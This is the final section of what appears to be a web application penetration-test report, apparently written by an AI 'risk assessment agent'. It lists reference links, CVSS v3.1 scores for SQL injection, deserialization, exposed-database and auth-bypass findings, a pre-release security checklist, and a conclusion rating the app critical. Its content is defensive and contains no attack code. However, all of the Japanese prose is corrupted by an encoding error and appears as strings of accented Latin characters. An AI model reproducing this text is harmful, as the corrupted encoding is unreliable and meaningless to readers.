
### 6.2 å‚è€ƒè³‡æ–™

- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [NIST NVD](https://nvd.nist.gov/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Microsoft Security Best Practices](https://learn.microsoft.com/en-us/aspnet/core/security/)
- [PostgreSQL Security Best Practices](https://www.postgresql.org/docs/current/security.html)

---

### 6.3 å…¨ãƒ¬ãƒãƒ¼ãƒˆãƒªãƒ³ã‚¯

- [01-æƒ…å ±åé›†](01-æƒ…å ±åé›†.md)
- [02-ã‚¢ã‚¿ãƒƒã‚¯ã‚µãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹å®šç¾©](02-ã‚¢ã‚¿ãƒƒã‚¯ã‚µãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹å®šç¾©.md)
- [03-ã‚¹ã‚­ãƒ£ãƒ³](03-ã‚¹ã‚­ãƒ£ãƒ³.md)
- [04-åˆ—æŒ™](04-åˆ—æŒ™.md)
- [05-æ¤œè¨¼é …ç›®](05-æ¤œè¨¼é …ç›®.md)
- [06-æ¤œè¨¼](06-æ¤œè¨¼.md)
- [ZAP ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã‚¹ã‚­ãƒ£ãƒ³](zap-active-scan.md)

---

### 6.4 CVSS v3.1 ã‚¹ã‚³ã‚¢ãƒªãƒ³ã‚°è©³ç´°

å„è„†å¼±æ€§ã®CVSSã‚¹ã‚³ã‚¢ã¯ä»¥ä¸‹ã®åŸºæº–ã§ç®—å‡ºã—ã¾ã—ãŸ:

**VULN-001 (SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ - èªè¨¼ãƒã‚¤ãƒ‘ã‚¹): 10.0**
- AV:N (Network) - ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯çµŒç”±ã§æ”»æ’ƒå¯èƒ½
- AC:L (Low) - æ”»æ’ƒã®è¤‡é›‘åº¦ãŒä½ã„
- PR:N (None) - ç‰¹æ¨©ä¸è¦
- UI:N (None) - ãƒ¦ãƒ¼ã‚¶ãƒ¼æ“ä½œä¸è¦
- S:C (Changed) - ã‚¹ã‚³ãƒ¼ãƒ—ãŒå¤‰åŒ–ï¼ˆèªè¨¼ã‚·ã‚¹ãƒ†ãƒ å…¨ä½“ã«å½±éŸ¿ï¼‰
- C:H (High) - æ©Ÿå¯†æ€§ã¸ã®å½±éŸ¿ãŒé«˜ã„
- I:H (High) - å®Œå…¨æ€§ã¸ã®å½±éŸ¿ãŒé«˜ã„
- A:H (High) - å¯ç”¨æ€§ã¸ã®å½±éŸ¿ãŒé«˜ã„

**VULN-002 (å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º): 10.0**
- åŒä¸Šï¼ˆRCEã«ã‚ˆã‚Šã‚µãƒ¼ãƒãƒ¼å…¨ä½“ãŒæŒæ¡ã•ã‚Œã‚‹ï¼‰

**VULN-003-004 (SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³): 9.8**
- S:U (Unchanged) ã«å¤‰æ›´ï¼ˆèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ã§ã¯ãªã„ãŸã‚ï¼‰
- ãã®ä»–ã¯åŒã˜

**VULN-005 (DBãƒãƒ¼ãƒˆå¤–éƒ¨å…¬é–‹): 9.8**
- ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã‚’å®Œå…¨ã«è¿‚å›ã§ãã‚‹ãŸã‚ Critical

**VULN-006 (èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ - DELETE): 9.1**
- C:N (None) - å‰Šé™¤æ“ä½œã®ãŸã‚æ©Ÿå¯†æ€§ã¸ã®ç›´æ¥å½±éŸ¿ãªã—
- I:H, A:H - å®Œå…¨æ€§ãƒ»å¯ç”¨æ€§ã¸ã®å½±éŸ¿ã¯é«˜ã„

ï¼ˆä»¥ä¸‹çœç•¥ï¼‰

---

### 6.5 ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆï¼ˆæœ¬ç•ªãƒªãƒªãƒ¼ã‚¹å‰ï¼‰

**èªè¨¼ãƒ»èªå¯**
- [ ] ã™ã¹ã¦ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«èªè¨¼ãŒå®Ÿè£…ã•ã‚Œã¦ã„ã‚‹
- [ ] ãƒ­ãƒ¼ãƒ«ãƒ™ãƒ¼ã‚¹èªå¯ãŒé©åˆ‡ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹
- [ ] JWTãƒˆãƒ¼ã‚¯ãƒ³ãŒå®‰å…¨ã«ç®¡ç†ã•ã‚Œã¦ã„ã‚‹
- [ ] ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãŒå®Ÿè£…ã•ã‚Œã¦ã„ã‚‹

**ãƒ‡ãƒ¼ã‚¿ä¿è­·**
- [ ] ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒBCrypt/Argon2ã§ãƒãƒƒã‚·ãƒ¥åŒ–ã•ã‚Œã¦ã„ã‚‹
- [ ] APIãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ãªã„
- [ ] ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šãŒSSL/TLSæš—å·åŒ–ã•ã‚Œã¦ã„ã‚‹
- [ ] ç’°å¢ƒå¤‰æ•°ã‹ã‚‰èªè¨¼æƒ…å ±ãŒèª­ã¿è¾¼ã¾ã‚Œã¦ã„ã‚‹

**ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–**
- [ ] ã™ã¹ã¦ã®SQLã‚¯ã‚¨ãƒªãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã•ã‚Œã¦ã„ã‚‹
- [ ] ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ãŒã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã¦ã„ã‚‹
- [ ] XSSå¯¾ç­–ãŒå®Ÿè£…ã•ã‚Œã¦ã„ã‚‹
- [ ] CSPãƒ˜ãƒƒãƒ€ãƒ¼ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹

**ã‚¤ãƒ³ãƒ•ãƒ©**
- [ ] ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆãŒå¤–éƒ¨å…¬é–‹ã•ã‚Œã¦ã„ãªã„
- [ ] Dockerã‚³ãƒ³ãƒ†ãƒŠãŒérootãƒ¦ãƒ¼ã‚¶ãƒ¼ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ãŒã™ã¹ã¦è¨­å®šã•ã‚Œã¦ã„ã‚‹
- [ ] HTTPS/TLSãŒæœ‰åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹

**ç›£è¦–ãƒ»ãƒ­ã‚°**
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆãŒãƒ­ã‚°ã«è¨˜éŒ²ã•ã‚Œã¦ã„ã‚‹
- [ ] ã‚¨ãƒ©ãƒ¼ãƒ­ã‚°ã«æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ãªã„
- [ ] ç›£è¦–ã‚¢ãƒ©ãƒ¼ãƒˆãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹

---

## 7. çµè«–

æœ¬è¨ºæ–­ã«ã‚ˆã‚Šã€å¯¾è±¡ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¯**Critical: 9ä»¶ã€High: 2ä»¶ã€Medium: 5ä»¶ã®è¨ˆ16ä»¶ã®è„†å¼±æ€§**ãŒç¢ºèªã•ã‚Œã¾ã—ãŸã€‚

**æœ€ã‚‚é‡å¤§ãªå•é¡Œç‚¹**:
1. èªè¨¼ãƒ»èªå¯æ©Ÿæ§‹ã®å®Œå…¨æ¬ å¦‚
2. SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹å…¨ãƒ‡ãƒ¼ã‚¿æ¼æ´©ãƒªã‚¹ã‚¯
3. RCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰ã®å¯èƒ½æ€§
4. ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¹³æ–‡ä¿å­˜ãƒ»é€ä¿¡
5. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ãƒˆã®å¤–éƒ¨å…¬é–‹

**ç·åˆè©•ä¾¡**: ğŸ”´ **CRITICAL - æœ¬ç•ªç’°å¢ƒã¸ã®å±•é–‹ã¯çµ¶å¯¾ã«ä¸å¯**

ç¾çŠ¶ã®ã¾ã¾ã§ã¯ã€æ”»æ’ƒè€…ãŒæ•°åˆ†ä»¥å†…ã«ã‚·ã‚¹ãƒ†ãƒ å…¨ä½“ã‚’æŒæ¡ã§ãã‚‹çŠ¶æ…‹ã§ã™ã€‚Phase 1ï¼ˆç·Šæ€¥å¯¾å¿œï¼‰ã®æ˜¯æ­£æªç½®ã‚’å³åº§ã«å®Ÿæ–½ã—ã€ã™ã¹ã¦ã®Criticalè„†å¼±æ€§ã‚’è§£æ¶ˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãã®å¾Œã€Phase 2ï¼ˆåŸºç›¤å¼·åŒ–ï¼‰ã§ã‚»ã‚­ãƒ¥ã‚¢ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã‚’æ§‹ç¯‰ã—ã€Phase 3ï¼ˆç¶™ç¶šçš„æ”¹å–„ï¼‰ã§DevSecOpsãƒ—ãƒ­ã‚»ã‚¹ã‚’ç¢ºç«‹ã™ã‚‹ã“ã¨ã‚’å¼·ãæ¨å¥¨ã—ã¾ã™ã€‚

---

**ãƒ¬ãƒãƒ¼ãƒˆä½œæˆæ—¥æ™‚**: 2026å¹´02æœˆ23æ—¥  
**ä½œæˆè€…**: CEHãƒªã‚¹ã‚¯è©•ä¾¡ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ  
**æ‰¿èª**: ï¼ˆè¦æ‰¿èªï¼‰  
**æ¬¡å›è¨ºæ–­äºˆå®š**: Phase 1å®Œäº†å¾Œã€å†è¨ºæ–­ã‚’å®Ÿæ–½
